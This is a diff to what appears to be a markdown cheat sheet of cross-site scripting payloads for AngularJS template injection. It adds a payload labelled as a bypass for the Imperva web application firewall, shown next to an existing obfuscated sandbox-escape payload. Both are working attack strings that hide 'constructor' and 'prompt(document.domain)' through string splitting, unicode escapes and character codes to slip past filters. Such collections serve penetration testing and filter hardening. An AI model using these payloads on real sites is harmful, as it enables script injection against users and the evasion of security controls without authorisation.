@@ -175,6 +175,12 @@ AngularJS (without `'` single and `"` double quotes and `constructor` string)
 {{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
 ```
 
+AngularJS bypass Waf [Imperva]
+
+```javascript
+{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
+```
+
 ### Blind XSS
 
 1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
